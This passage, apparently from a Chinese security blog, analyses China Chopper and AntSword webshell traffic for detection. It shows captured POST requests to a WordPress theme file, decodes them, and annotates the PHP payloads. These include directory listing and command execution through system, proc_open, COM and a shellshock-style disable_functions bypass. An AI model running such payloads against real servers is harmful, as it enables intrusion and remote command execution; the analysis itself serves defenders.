class="variable">$_POST</span>[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=Yzpcd3d3cm9vdFwxOTIuMTY4LjIzMi4xMzA%3D</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行URL解码后</span></span><br><span class="line">@<span class="built_in">eval</span>.(base64_decode(<span class="variable">$_POST</span>[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=Yzpcd3d3cm9vdFwxOTIuMTY4LjIzMi4xMzA=</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次进行Base64_encode</span></span><br><span class="line"></span><br><span class="line">action=@ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;0&quot;</span>);@set_time_limit(0);@set_magic_quotes_runtime(0);<span class="built_in">echo</span>(<span class="string">&quot;-&gt;|&quot;</span>);;<span class="variable">$D</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;z1&quot;</span>]);<span class="variable">$F</span>=@opendir(<span class="variable">$D</span>);<span class="keyword">if</span>(<span class="variable">$F</span>==NULL)&#123;<span class="built_in">echo</span>(<span class="string">&quot;ERROR:// Path Not Found Or No Permission!&quot;</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$M</span>=NULL;<span class="variable">$L</span>=NULL;<span class="keyword">while</span>(<span class="variable">$N</span>=@readdir(<span class="variable">$F</span>))&#123;<span class="variable">$P</span>=<span class="variable">$D</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$N</span>;<span class="variable">$T</span>=@<span class="built_in">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>,@filemtime(<span class="variable">$P</span>));@<span class="variable">$E</span>=substr(base_convert(@fileperms(<span class="variable">$P</span>),10,8),-4);<span class="variable">$R</span>=<span class="string">&quot;\t&quot;</span>.<span class="variable">$T</span>.<span class="string">&quot;\t&quot;</span>.@filesize(<span class="variable">$P</span>).<span class="string">&quot;\t&quot;</span>.<span class="variable">$E</span>.<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;<span class="keyword">if</span>(@is_dir(<span class="variable">$P</span>))<span class="variable">$M</span>.=<span class="variable">$N</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$R</span>;<span class="keyword">else</span> <span class="variable">$L</span>.=<span class="variable">$N</span>.<span class="variable">$R</span>;&#125;<span class="built_in">echo</span> <span class="variable">$M</span>.<span class="variable">$L</span>;@closedir(<span class="variable">$F</span>);&#125;;<span class="built_in">echo</span>(<span class="string">&quot;|&lt;-&quot;</span>);die();</span><br><span class="line"></span><br><span class="line">z1=c:\wwwroot\192.168.232.130</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210281053493.png" data-fancybox="true"/></div></div><p><strong>其中特征点有如下三部分</strong></p><ol><li>“eval”,eval函数用于执行传递的攻击payload，这是必不可少的； </li><li><code>(base64_decode($\_POST[action]))</code>,<code>(base64_decode($_POST[action]))</code>将攻击payload进行Base64解码，因为菜刀默认是将攻击载荷使用Base64编码,以避免被检测; </li><li><code>&amp;z1=Yzpcd3d3cm9vdFwxOTIuMTY4LjIzMi4xMzA=</code>,该部分是传递攻击payload,此参数z1对应$_POST[z1]接收到的数据,该参数值是使用Base64编码的,所以可以利用base64解码可以看到攻击明文</li></ol><p>注:</p><ol><li>有少数时候eval方法会被assert方法替代 </li><li>$_POST也会被_GET、$_REQUEST替代 </li><li>z1是菜刀默认的参数,这个地方也有可能被修改为其他参数名。</li></ol><h2 id="中国蚁剑-AntSword"><a href="#中国蚁剑-AntSword" class="headerlink" title="中国蚁剑(AntSword)"></a>中国蚁剑(AntSword)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /wp-content/themes/twentytwenty/header.php HTTP/1.1</span><br><span class="line">Host: 192.168.232.135:80</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4124</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">a=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%222f95956%22%3Becho%20%40asenc(%24output)%3Becho%20%22aad7a6fedd4%22%3B%7Dob_start()%3Btry%7B%24p%3Dbase64_decode(substr(%24_POST%5B%22oba9958b61aab5%22%5D%2C2))%3B%24s%3Dbase64_decode(substr(%24_POST%5B%22x958c36f4a4706%22%5D%2C2))%3B%24envstr%3D%40base64_decode(substr(%24_POST%5B%22m33f4b7bc545c7%22%5D%2C2))%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24c%3Dsubstr(%24d%2C0%2C1)%3D%3D%22%2F%22%3F%22-c%20%5C%22%7B%24s%7D%5C%22%22%3A%22%2Fc%20%5C%22%7B%24s%7D%5C%22%22%3Bif(substr(%24d%2C0%2C1)%3D%3D%22%2F%22)%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%22)%3B%7Delse%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3BC%3A%2FWindows%2Fsystem32%3BC%3A%2FWindows%2FSysWOW64%3BC%3A%2FWindows%3BC%3A%2FWindows%2FSystem32%2FWindowsPowerShell%2Fv1.0%2F%3B%22)%3B%7Dif(!empty(%24envstr))%7B%24envarr%3Dexplode(%22%7C%7C%7Casline%7C%7C%7C%22%2C%20%24envstr)%3Bforeach(%24envarr%20as%20%24v)%20%7Bif%20(!empty(%24v))%20%7B%40putenv(str_replace(%22%7C%7C%7Caskey%7C%7C%7C%22%2C%20%22%3D%22%2C%20%24v))%3B%7D%7D%7D%24r%3D%22%7B%24p%7D%20%7B%24c%7D%22%3Bfunction%20fe(%24f)%7B%24d%3Dexplode(%22%2C%22%2C%40ini_get(%22disable_functions%22))%3Bif(empty(%24d))%7B%24d%3Darray()%3B%7Delse%7B%24d%3Darray_map(<span class="string">&#x27;trim&#x27;</span>%2Carray_map(<span class="string">&#x27;strtolower&#x27;</span>%2C%24d))%3B%7Dreturn(function_exists(%24f)%26%26is_callable(%24f)%26%26!in_array(%24f%2C%24d))%3B%7D%3Bfunction%20runshellshock(%24d%2C%20%24c)%20%7Bif%20(substr(%24d%2C%200%2C%201)%20%3D%3D%20%22%2F%22%20%26%26%20fe(<span class="string">&#x27;putenv&#x27;</span>)%20%26%26%20(fe(<span class="string">&#x27;error_log&#x27;</span>)%20%7C%7C%20fe(<span class="string">&#x27;mail&#x27;</span>)))%20%7Bif%20(strstr(<span class="built_in">readlink</span>(%22%2Fbin%2Fsh%22)%2C%20%22bash%22)%20!%3D%20FALSE)%20%7B%24tmp%20%3D%20tempnam(sys_get_temp_dir()%2C%20<span class="string">&#x27;as&#x27;</span>)%3Bputenv(%22PHP_LOL%3D()%20%7B%20x%3B%20%7D%3B%20%24c%20%3E%24tmp%202%3E%261%22)%3Bif%20(fe(<span class="string">&#x27;error_log&#x27;</span>))%20%7Berror_log(%22a%22%2C%201)%3B%7D%20else%20%7Bmail(%22a%40127.0.0.1%22%2C%20%22%22%2C%20%22%22%2C%20%22-bv%22)%3B%7D%7D%20else%20%7Breturn%20False%3B%7D%24output%20%3D%20%40file_get_contents(%24tmp)%3B%40unlink(%24tmp)%3Bif%20(%24output%20!%3D%20%22%22)%20%7Bprint(%24output)%3Breturn%20True%3B%7D%7Dreturn%20False%3B%7D%3Bfunction%20runcmd(%24c)%7B%24ret%3D0%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(fe(<span class="string">&#x27;system&#x27;</span>))%7B%40system(%24c%2C%24ret)%3B%7Delseif(fe(<span class="string">&#x27;passthru&#x27;</span>))%7B%40passthru(%24c%2C%24ret)%3B%7Delseif(fe(<span class="string">&#x27;shell_exec&#x27;</span>))%7Bprint(%40shell_exec(%24c))%3B%7Delseif(fe(<span class="string">&#x27;exec&#x27;</span>))%7B%40exec(%24c%2C%24o%2C%24ret)%3Bprint(<span class="built_in">join</span>(%22%0A%22%2C%24o))%3B%7Delseif(fe(<span class="string">&#x27;popen&#x27;</span>))%7B%24fp%3D%40popen(%24c%2C<span class="string">&#x27;r&#x27;</span>)%3Bwhile(!%40feof(%24fp))%7Bprint(%40fgets(%24fp%2C2048))%3B%7D%40pclose(%24fp)%3B%7Delseif(fe(<span class="string">&#x27;proc_open&#x27;</span>))%7B%24p%20%3D%20%40proc_open(%24c%2C%20array(1%20%3D%3E%20array(<span class="string">&#x27;pipe&#x27;</span>%2C%20<span class="string">&#x27;w&#x27;</span>)%2C%202%20%3D%3E%20array(<span class="string">&#x27;pipe&#x27;</span>%2C%20<span class="string">&#x27;w&#x27;</span>))%2C%20%24io)%3Bwhile(!%40feof(%24io%5B1%5D))%7Bprint(%40fgets(%24io%5B1%5D%2C2048))%3B%7Dwhile(!%40feof(%24io%5B2%5D))%7Bprint(%40fgets(%24io%5B2%5D%2C2048))%3B%7D%40fclose(%24io%5B1%5D)%3B%40fclose(%24io%5B2%5D)%3B%40proc_close(%24p)%3B%7Delseif(fe(<span class="string">&#x27;antsystem&#x27;</span>))%7B%40antsystem(%24c)%3B%7Delseif(runshellshock(%24d%2C%20%24c))%20%7Breturn%20%24ret%3B%7Delseif(substr(%24d%2C0%2C1)!%3D%22%2F%22%20%26%26%20%40class_exists(%22COM%22))%7B%24w%3Dnew%20COM(<span class="string">&#x27;WScript.shell&#x27;</span>)%3B%24e%3D%24w-%3Eexec(%24c)%3B%24so%3D%24e-%3EStdOut()%3B%24ret.%3D%24so-%3EReadAll()%3B%24se%3D%24e-%3EStdErr()%3B%24ret.%3D%24se-%3EReadAll()%3Bprint(%24ret)%3B%7Delse%7B%24ret%20%3D%20127%3B%7Dreturn%20%24ret%3B%7D%3B%24ret%3D%40runcmd(%24r.%22%202%3E%261%22)%3Bprint%20(%24ret!%3D0)%3F%22ret%3D%7B%24ret%7D%22%3A%22%22%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&amp;m33f4b7bc545c7=uS&amp;oba9958b61aab5=3qY21k&amp;x958c36f4a4706=CWY2QgL2QgImM6XFx3d3dyb290XFwxOTIuMTY4LjIzMi4xMzVcXHdwLWNvbnRlbnRcXHRoZW1lc1xcdHdlbnR5dHdlbnR5IiZ3aG9hbWkmZWNobyBbU10mY2QmZWNobyBbRV0%3D</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210282245988.png" data-fancybox="true"/></div></div><p>对上方进行URL解码后显示如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@set_time_limit(0);<span class="keyword">function</span> asenc(<span class="variable">$out</span>)&#123;<span class="built_in">return</span> <span class="variable">$out</span>;&#125;;<span class="keyword">function</span> <span class="function"><span class="title">asoutput</span></span>()&#123;<span class="variable">$output</span>=ob_get_contents();ob_end_clean();<span class="built_in">echo</span> <span class="string">&quot;2f95956&quot;</span>;<span class="built_in">echo</span> @asenc(<span class="variable">$output</span>);<span class="built_in">echo</span> <span class="string">&quot;aad7a6fedd4&quot;</span>;&#125;ob_start();try&#123;<span class="variable">$p</span>=base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;oba9958b61aab5&quot;</span>],2));<span class="variable">$s</span>=base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;x958c36f4a4706&quot;</span>],2));<span class="variable">$envstr</span>=@base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;m33f4b7bc545c7&quot;</span>],2));<span class="variable">$d</span>=<span class="built_in">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$c</span>=substr(<span class="variable">$d</span>,0,1)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;&#123;<span class="variable">$s</span>&#125;\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;&#123;<span class="variable">$s</span>&#125;\&quot;&quot;</span>;<span class="keyword">if</span>(substr(<span class="variable">$d</span>,0,1)==<span class="string">&quot;/&quot;</span>)&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);&#125;<span class="keyword">else</span>&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);&#125;<span class="keyword">if</span>(!empty(<span class="variable">$envstr</span>))&#123;<span class="variable">$envarr</span>=explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);foreach(<span class="variable">$envarr</span> as <span class="variable">$v</span>) &#123;<span class="keyword">if</span> (!empty(<span class="variable">$v</span>)) &#123;@putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));&#125;&#125;&#125;<span class="variable">$r</span>=<span class="string">&quot;&#123;<span class="variable">$p</span>&#125; &#123;<span class="variable">$c</span>&#125;&quot;</span>;<span class="keyword">function</span> fe(<span class="variable">$f</span>)&#123;<span class="variable">$d</span>=explode(<span class="string">&quot;,&quot;</span>,@ini_get(<span class="string">&quot;disable_functions&quot;</span>));<span class="keyword">if</span>(empty(<span class="variable">$d</span>))&#123;<span class="variable">$d</span>=array();&#125;<span class="keyword">else</span>&#123;<span class="variable">$d</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,array_map(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));&#125;<span class="built_in">return</span>(function_exists(<span class="variable">$f</span>)&amp;&amp;is_callable(<span class="variable">$f</span>)&amp;&amp;!in_array(<span class="variable">$f</span>,<span class="variable">$d</span>));&#125;;<span class="keyword">function</span> runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>) &#123;<span class="keyword">if</span> (substr(<span class="variable">$d</span>, 0, 1) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;<span class="keyword">if</span> (strstr(<span class="built_in">readlink</span>(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != FALSE) &#123;<span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="variable">$c</span> &gt;<span class="variable">$tmp</span> 2&gt;&amp;1&quot;</span>);<span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;error_log(<span class="string">&quot;a&quot;</span>, 1);&#125; <span class="keyword">else</span> &#123;mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);&#125;&#125; <span class="keyword">else</span> &#123;<span class="built_in">return</span> False;&#125;<span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);@<span class="built_in">unlink</span>(<span class="variable">$tmp</span>);<span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;<span class="built_in">print</span>(<span class="variable">$output</span>);<span class="built_in">return</span> True;&#125;&#125;<span class="built_in">return</span> False;&#125;;<span class="keyword">function</span> runcmd(<span class="variable">$c</span>)&#123;<span class="variable">$ret</span>=0;<span class="variable">$d</span>=<span class="built_in">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="keyword">if</span>(fe(<span class="string">&#x27;system&#x27;</span>))&#123;@system(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;elseif(fe(<span class="string">&#x27;passthru&#x27;</span>))&#123;@passthru(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;elseif(fe(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;<span class="built_in">print</span>(@shell_exec(<span class="variable">$c</span>));&#125;elseif(fe(<span class="string">&#x27;exec&#x27;</span>))&#123;@<span class="built_in">exec</span>(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);<span class="built_in">print</span>(<span class="built_in">join</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>,<span class="variable">$o</span>));&#125;elseif(fe(<span class="string">&#x27;popen&#x27;</span>))&#123;<span class="variable">$fp</span>=@popen(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$fp</span>))&#123;<span class="built_in">print</span>(@fgets(<span class="variable">$fp</span>,2048));&#125;@pclose(<span class="variable">$fp</span>);&#125;elseif(fe(<span class="string">&#x27;proc_open&#x27;</span>))&#123;<span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, array(1 =&gt; array(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), 2 =&gt; array(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[1]))&#123;<span class="built_in">print</span>(@fgets(<span class="variable">$io</span>[1],2048));&#125;<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[2]))&#123;<span class="built_in">print</span>(@fgets(<span class="variable">$io</span>[2],2048));&#125;@fclose(<span class="variable">$io</span>[1]);@fclose(<span class="variable">$io</span>[2]);@proc_close(<span class="variable">$p</span>);&#125;elseif(fe(<span class="string">&#x27;antsystem&#x27;</span>))&#123;@antsystem(<span class="variable">$c</span>);&#125;elseif(runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;<span class="built_in">return</span> <span class="variable">$ret</span>;&#125;elseif(substr(<span class="variable">$d</span>,0,1)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>))&#123;<span class="variable">$w</span>=new COM(<span class="string">&#x27;WScript.shell&#x27;</span>);<span class="variable">$e</span>=<span class="variable">$w</span>-&gt;<span class="built_in">exec</span>(<span class="variable">$c</span>);<span class="variable">$so</span>=<span class="variable">$e</span>-&gt;StdOut();<span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;ReadAll();<span class="variable">$se</span>=<span class="variable">$e</span>-&gt;StdErr();<span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;ReadAll();<span class="built_in">print</span>(<span class="variable">$ret</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$ret</span> = 127;&#125;<span class="built_in">return</span> <span class="variable">$ret</span>;&#125;;<span class="variable">$ret</span>=@runcmd(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);<span class="built_in">print</span> (<span class="variable">$ret</span>!=0)?<span class="string">&quot;ret=&#123;<span class="variable">$ret</span>&#125;&quot;</span>:<span class="string">&quot;&quot;</span>;;&#125;catch(Exception <span class="variable">$e</span>)&#123;<span class="built_in">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();&#125;;asoutput();die();&amp;m33f4b7bc545c7=uS&amp;oba9958b61aab5=3qY21k&amp;x958c36f4a4706=CWY2QgL2QgImM6XFx3d3dyb290XFwxOTIuMTY4LjIzMi4xMzVcXHdwLWNvbnRlbnRcXHRoZW1lc1xcdHdlbnR5dHdlbnR5IiZ3aG9hbWkmZWNobyBbU10mY2QmZWNobyBbRV0=</span><br></pre></td></tr></table></figure><p>通过上方可分析出蚁剑通过POST接收了三个参数</p><ol><li>oba9958b61aab5</li><li>x958c36f4a4706</li><li>m33f4b7bc545c7</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先提取出第一个参数的值也就是a的值</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>); <span class="comment">// 关闭错误显示</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>); <span class="comment">// 设置脚本最大执行时间为无限</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 asenc 函数，直接返回输入的内容</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 asoutput 函数，输出结果并添加前后缀</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">// 获取输出缓冲区的内容</span></span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>(); <span class="comment">// 清空缓冲区并关闭</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;2f95956&quot;</span>; <span class="comment">// 输出前缀</span></span><br><span class="line">    <span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>); <span class="comment">// 安全地调用 asenc 函数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;aad7a6fedd4&quot;</span>; <span class="comment">// 输出后缀</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(); <span class="comment">// 启动输出缓冲区</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 解码 POST 请求中的数据</span></span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;oba9958b61aab5&quot;</span>], <span class="number">2</span>)); <span class="comment">// 解码第一个参数</span></span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;x958c36f4a4706&quot;</span>], <span class="number">2</span>)); <span class="comment">// 解码第二个参数</span></span><br><span class="line">    <span class="variable">$envstr</span> = @<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;m33f4b7bc545c7&quot;</span>], <span class="number">2</span>)); <span class="comment">// 解码环境变量字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$d</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]); <span class="comment">// 获取当前脚本所在目录</span></span><br><span class="line">    <span class="comment">// 根据操作系统决定命令参数格式</span></span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> ? <span 